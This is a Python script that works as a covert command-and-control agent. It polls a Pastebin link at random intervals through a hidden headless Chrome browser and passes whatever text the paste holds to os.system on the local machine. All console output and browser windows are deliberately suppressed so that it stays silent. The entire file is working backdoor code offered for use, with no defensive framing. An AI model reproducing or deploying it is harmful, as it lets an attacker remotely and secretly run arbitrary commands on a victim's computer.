# import selenium and chrome-webdriver (core functions)
# import os and sys for system control
# import random to select random time interval
# import timeloop & datetime (time management)
import os
import sys
import random
from datetime import timedelta
from subprocess import CREATE_NO_WINDOW

from selenium import webdriver
from selenium.webdriver.chrome.service import Service as ChromeService
from selenium.webdriver.common.by import By
from timeloop import Timeloop
from webdriver_manager.chrome import ChromeDriverManager

# Pastebin link is exactly what it says. Script will check for commands there and then execute them locally
pastebinLink = ""
# Type numbers in seconds here (from-to), "random" library will choose something in between
x = 1
y = 10

# silent-execution /this is here, so that the script will never have any unwanted output.
sys.stdout = open(os.devnull, 'a')
sys.stderr = open(os.devnull, 'a')


# update commands /this is basically start of the script, random number is generated and Timeloop() is defined
tl = Timeloop()
updateinterval = random.randint(x, y)


# this is the real start of the check-pastebin-then-execute interval named updatecmd()
@tl.job(interval=timedelta(seconds=updateinterval))
def updatecmd():
    chrome_service = ChromeService('chromedriver')
    # create_no_window is needed so that chrome will not show itself while updating commands
    chrome_service.creationflags = CREATE_NO_WINDOW
    # this is definition of options, so that we can refer to chromedriver faster and easier
    options = webdriver.ChromeOptions()
    # silent-execution /this option here will disable some info, that chromedriver would want to give us, thus no cmd
    # window pop-ups in Windows os
    options.add_experimental_option('excludeSwitches', ['enable-logging'])
    # options /these are additional options, that are good to have for a silent operation
    options.headless = True
    options.add_argument("--disable-logging")
    options.add_argument("--disable-gpu")
    options.add_argument("--disable-crash-reporter")
    options.add_argument("--disable-extensions")
    options.add_argument("--log-level=3")
    options.add_argument("--output=/dev/null")
    # starting sequence of chromedriver
    driver = webdriver.Chrome(service=ChromeService(ChromeDriverManager().install()), options=options)
    # driver will now search for pastebin link, that you provided
    driver.get(pastebinLink)
    # now it searches for content of your paste
    search = driver.find_element(by=By.CLASS_NAME, value="de1")
    # script will now execute results in cmd
    os.system(search.text)
    driver.quit()


tl.start(block=True)